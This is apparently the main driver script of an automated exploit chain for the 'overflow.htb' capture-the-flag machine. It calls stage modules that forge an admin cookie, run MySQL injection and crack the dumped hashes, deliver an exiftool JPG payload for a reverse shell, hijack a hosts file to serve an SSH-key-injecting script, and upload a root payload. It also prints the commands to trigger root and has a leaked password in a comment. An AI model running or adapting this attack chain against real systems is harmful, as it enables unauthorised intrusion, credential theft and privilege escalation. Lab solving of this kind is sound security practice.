#!/usr/bin/env python3

import os
import sys
import socket
import threading
import logging
from logging.handlers import RotatingFileHandler

from http.server import HTTPServer

import settings
from common_tools import Colors

import stage1
import stage2
import stage3
import stage4
import stage5



stages = {
    "1" : """Retrieve admin cookie from http://overflow.htb""",
    "2" : """Perform MySQL Injection to retrieve CMS editor credentials and crack the hashed password""",
    "3" : """Upload crafted jpg image to get reverse shell and gain access to system as developer""",
    "4" : """Privilege escalation (from developer to tester account) :
- create local SSH Key pair
- create custom script to inject our pub key to remote server
- create local web server that will shutdown itself when our payload is downloaded""",
    "5" : """Privilege escalation (from tester to root account)""",
}


def get_banner_stage(stage_number: int):
    banner = '\n'+Colors.colorize("======================================================", 'RED')+'\n'
    banner += Colors.colorize("Stage "+str(stage_number)+" : ", 'RED')
    banner += Colors.colorize(stages[str(stage_number)], 'YELLOW')+'\n'
    banner += Colors.colorize("======================================================", 'RED')+'\n'
    return banner




def solve_machine():

    """
        Stage 1
    """
    print(get_banner_stage(1))

    cookie_solver = stage1.Admin_cookie()
    cookie_solver.retrieve_random_cookie()
    cookie_solver.crack_admin_cookie()
    admin_cookie_value = cookie_solver.get_admin_cookie()[1]

    """
        Stage 2
    """
    print(get_banner_stage(2))

    db_dumper = stage2.DB_dump(cookie=admin_cookie_value)
    db_dumper.dump_schemas()
    db_dumper.dump_cms_owner_account()
    db_dumper.dump_salt()
    db_dumper.crack_cms_password(wordlist=settings.wordlists_folder+"rockyou.txt")
    print(Colors.begin_success+Colors.colorize("All important data retrieved from DB : ", 'GREEN'))
    print(db_dumper)

    """
        Stage 3
    """
    print(get_banner_stage(3))

    exiftool_sploit = stage3.Exiftool_exploit()
    exiftool_sploit.create_payload()

    server_thread = threading.Thread(target=exiftool_sploit.create_listener, args=())
    server_thread.start()

    exiftool_sploit.send_payload()
    exiftool_sploit.revert_payload_jpg()
    developer_login, developer_passwd = exiftool_sploit.get_account_credentials()

    """
        Stage 4
    """
    print(get_banner_stage(4))

    developer_obj = stage4.Developer_to_tester(login=developer_login, password=developer_passwd)
    #developer_obj = stage4.Developer_to_tester(login='developer', password="sh@tim@n")
    developer_obj.find_vuln_script()
    developer_obj.print_remote_script()

    stage4.create_ssh_key_files()
    stage4.create_fake_script()

    developer_obj.modify_hosts_file()
    server = stage4.StoppableHttpServer(('0.0.0.0', 80), stage4.Requests_handler)
    server.serve_forever()
    developer_obj.restore_hosts_file()

    """
        Stage 5 : Connect as tester and become root
    """
    print(get_banner_stage(5))

    #TBD
    stage5.gen_payload()
    tester_obj = stage5.Tester_to_root()
    tester_obj.upload_payload()
    print(Colors.begin_success+Colors.colorize("In order to execute payload and becoming root, you must do those 2 commands manually : ", 'YELLOW'))
    print(f"ssh -i {settings.rsa_key['priv']} tester@overflow.htb")
    print(f"(cat /tmp/{settings.final_payload_name};cat) | /opt/file_encrypt/file_encrypt")
    print("Then, you have to press Enter twice and then you can launch commands like 'whoami', 'id'...")
    print("Finally you can quit the root shell by passing 'exit' command")
    #tester_obj.becoming_root()






if __name__ == '__main__':

    #avoid PYTHONPATH dependency
    base_dir = os.path.dirname(os.path.realpath(__file__))
    os.chdir(base_dir)

    logging.basicConfig(
        handlers=[
            RotatingFileHandler(
                filename = settings.logs_config["filepath"],
                mode="a+",
                maxBytes= 3*1024*1024,
                backupCount=3,
                encoding='utf-8'
            )
        ],
        level=settings.logs_config["level"],
        format=settings.logs_config["format"]
    )

    if not settings.check_settings():
        sys.exit(1)


    solve_machine()


